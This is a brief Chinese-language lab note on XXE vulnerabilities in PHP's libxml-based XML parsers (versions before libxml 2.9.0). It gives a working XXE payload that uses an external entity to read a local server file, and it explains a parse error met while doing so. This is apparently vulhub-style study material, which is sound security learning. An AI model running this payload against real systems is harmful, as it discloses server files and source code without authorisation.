# XXE

受到影响的类和函数
`SimpleXMLElement`、`DOMDocument`、`simplexml_load_string`
(libxml<2.9.0, PHP 5, PHP 7)
libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡。为了演示PHP环境下的XXE漏洞，本例会将libxml2.8.0版本编译进PHP中。PHP版本并不影响XXE利用。

参考
	- https://github.com/vulhub/vulhub/tree/master/php/php_xxe
	- https://www.kingkk.com/2018/07/%E7%AE%80%E6%9E%90XXE/
	- https://www.php.net/manual/en/class.simplexmlelement.php
	- https://stackoverflow.com/questions/51103431/parsepi-pi-php-never-end-when-trying-to-run-a-new-unit-test

payload：
```php
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///var/www/html/dom.php" >]>
<root>
<name>&xxe;</name>
</root>
```
在获取dom.php文件时，最开始会报错
`DOMDocument::loadXML(): ParsePI: PI php never end ... in file:///var/www/html/dom.php, line: 7 in `
这是因为xml把`<?php`识别为标签的开始，但是并没有出现标签的结束`>`，加上就好了。
